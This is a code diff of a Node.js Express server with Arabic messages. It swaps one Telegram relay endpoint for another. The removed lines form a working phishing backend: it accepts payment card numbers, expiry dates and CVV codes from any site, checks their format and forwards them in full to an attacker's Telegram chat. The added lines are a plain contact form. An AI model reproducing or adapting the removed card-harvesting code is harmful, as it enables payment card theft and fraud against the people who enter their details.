@@ -1,56 +1,40 @@
-import express from "express";
-import axios from "axios";
-import dotenv from "dotenv";
-import bodyParser from "body-parser";
-import cors from "cors";  // إضافة CORS للسماح بطلبات من GitHub Pages
-
-dotenv.config();
+const express = require("express");
+const bodyParser = require("body-parser");
+const axios = require("axios");
+require("dotenv").config();
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-app.use(cors()); // السماح بالطلبات من جميع المصادر
-app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
+app.use(express.static("public")); // لتقديم index.html
+
+// متغيرات البيئة
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
 app.post("/send", async (req, res) => {
+    const { name, message } = req.body;
+
+    if (!name || !message) {
+        return res.status(400).json({ error: "يرجى إدخال جميع البيانات" });
+    }
+
+    const telegramMessage = `📩 *رسالة جديدة*\n👤 *الاسم:* ${name}\n💬 *الرسالة:* ${message}`;
+
     try {
-        const { cardNumber, expiryDate, cvv } = req.body;
-
-        if (!cardNumber || !expiryDate || !cvv) {
-            return res.status(400).json({ error: "يجب ملء جميع الحقول!" });
-        }
-
-        // التحقق من صحة البيانات
-        if (cardNumber.length !== 16 || isNaN(cardNumber)) {
-            return res.status(400).json({ error: "رقم البطاقة غير صحيح!" });
-        }
-
-        if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
-            return res.status(400).json({ error: "تاريخ الانتهاء غير صحيح!" });
-        }
-
-        if (cvv.length !== 3 || isNaN(cvv)) {
-            return res.status(400).json({ error: "رمز الأمان غير صحيح!" });
-        }
-
-        const text = `💳 معلومات الدفع الجديدة:\n\n🔢 رقم البطاقة: ${cardNumber}\n📅 تاريخ الانتهاء: ${expiryDate}\n🔐 CVV: ${cvv}`;
-
-        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: text,
-            parse_mode: "Markdown"
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: telegramMessage,
+            parse_mode: "Markdown",
         });
 
-        res.json({ success: true, message: "تم إرسال البيانات بنجاح!" });
+        res.json({ message: "تم إرسال البيانات بنجاح إلى تيليجرام!" });
     } catch (error) {
-        console.error("خطأ في إرسال البيانات:", error);
-        res.status(500).json({ error: "حدث خطأ أثناء الإرسال." });
+        res.status(500).json({ error: "حدث خطأ أثناء إرسال البيانات" });
     }
 });
 
 app.listen(PORT, () => {
-    console.log(`🚀 Server is running on port ${PORT}`);
+    console.log(`🚀 السيرفر يعمل على http://localhost:${PORT}`);
 });
